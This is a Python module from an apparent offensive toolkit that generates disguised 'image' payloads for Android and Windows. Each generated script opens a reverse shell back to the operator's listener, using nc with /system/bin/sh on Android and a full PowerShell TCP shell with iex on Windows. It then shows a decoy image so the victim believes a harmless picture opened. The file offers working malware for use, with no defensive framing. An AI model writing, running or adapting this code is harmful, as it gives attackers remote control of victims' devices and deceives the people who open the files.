import base64
import json
from pathlib import Path
import time

class ImagePayload:
    
    def __init__(self):
        self.output_dir = Path(__file__).parent.parent.parent / 'payloads' / 'images'
        self.output_dir.mkdir(parents=True, exist_ok=True)
    
    def generate(self, target_os='android'):
        if target_os == 'android':
            return self.generate_android()
        elif target_os == 'windows':
            return self.generate_windows()
        else:
            return self.generate_android()
    
    def generate_android(self):
        payload = f'''
# Android Image Exploit Payload
# This appears as a normal image but executes when opened

import android
import subprocess
import os

class ImageExploit:
    def __init__(self):
        self.target = "{self.get_listener_ip()}"
        self.port = {self.get_listener_port()}
    
    def execute(self):
        # Start reverse shell
        subprocess.Popen([
            "nc", self.target, str(self.port), "-e", "/system/bin/sh"
        ])
        
        # Show a harmless image
        self.show_image()
    
    def show_image(self):
        try:
            import android
            droid = android.Android()
            droid.startActivity(
                "android.intent.action.VIEW",
                "file:///sdcard/Download/sample.jpg"
            )
        except:
            pass

if __name__ == "__main__":
    exploit = ImageExploit()
    exploit.execute()
'''
        output_file = self.output_dir / f"image_payload_{int(time.time())}.py"
        with open(output_file, 'w') as f:
            f.write(payload)
        
        print(f"[+] Image payload generated: {output_file}")
        
        return {
            'success': True,
            'payload_file': str(output_file),
            'type': 'image',
            'platform': 'android',
            'message': 'Image payload generated successfully'
        }
    
    def generate_windows(self):
        payload = f'''
# Windows Image Exploit Payload
# This appears as a normal image but executes when opened

import os
import subprocess
import sys

class ImageExploit:
    def __init__(self):
        self.target = "{self.get_listener_ip()}"
        self.port = {self.get_listener_port()}
    
    def execute(self):
        # PowerShell reverse shell
        subprocess.Popen([
            "powershell", "-Command",
            f"$client = New-Object System.Net.Sockets.TCPClient('{self.target}',{self.port});"
            "$stream = $client.GetStream();"
            "[byte[]]$bytes = 0..65535|%{{0}};"
            "while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){{"
            "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);"
            "$sendback = (iex $data 2>&1 | Out-String );"
            "$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';"
            "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
            "$stream.Write($sendbyte,0,$sendbyte.Length);"
            "$stream.Flush()}};"
            "$client.Close()"
        ])
        
        # Open a normal image
        os.system("start sample.jpg")

if __name__ == "__main__":
    exploit = ImageExploit()
    exploit.execute()
'''
        output_file = self.output_dir / f"image_payload_windows_{int(time.time())}.py"
        with open(output_file, 'w') as f:
            f.write(payload)
        
        print(f"[+] Windows image payload generated: {output_file}")
        
        return {
            'success': True,
            'payload_file': str(output_file),
            'type': 'image',
            'platform': 'windows',
            'message': 'Windows image payload generated successfully'
        }
    
    def get_listener_ip(self):
        try:
            import socket
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(('8.8.8.8', 1))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return '0.0.0.0'
    
    def get_listener_port(self):
        config_file = Path('config/megalodon.json')
        if config_file.exists():
            with open(config_file, 'r') as f:
                config = json.load(f)
                return config.get('listener', {}).get('port', 4444)
        return 4444

def generate(target_os='android'):
    generator = ImagePayload()
    return generator.generate(target_os)
